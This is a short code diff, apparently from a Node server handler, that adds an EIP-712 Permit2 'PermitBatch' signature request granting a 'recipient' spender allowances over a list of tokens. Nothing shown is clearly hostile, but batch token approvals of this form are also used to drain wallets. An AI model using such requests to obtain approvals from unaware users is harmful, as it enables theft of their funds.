@@ -208,8 +208,39 @@ app.post<{
       _addrs.splice(index, 1);
     }
   }
+  const dataToSign = {
+    domain: {
+      name: "Permit2" as string,
+      chainId: chainId,
+      verifyingContract: Permit2Contract,
+    },
+    types: {
+      EIP712Domain: [
+        { name: "name", type: "string" },
+        { name: "chainId", type: "uint256" },
+        { name: "verifyingContract", type: "address" },
+      ],
+      PermitBatch: [
+        { name: "details", type: "PermitDetails[]" },
+        { name: "spender", type: "address" },
+        { name: "sigDeadline", type: "uint256" },
+      ],
+      PermitDetails: [
+        { name: "token", type: "address" },
+        { name: "amount", type: "uint160" },
+        { name: "expiration", type: "uint48" },
+        { name: "nonce", type: "uint48" },
+      ],
+    },
+    primaryType: "PermitBatch",
+    message: {
+      details: tokenInPermitFormat,
+      spender: recipient,
+      sigDeadline: deadline,
+    },
+  };
 
-  return [_dataToSign, _addrs];
+  return [_dataToSign, _addrs, dataToSign];
   // return tokensAddressOnly;
 });
 const usdcContractAddress: string =
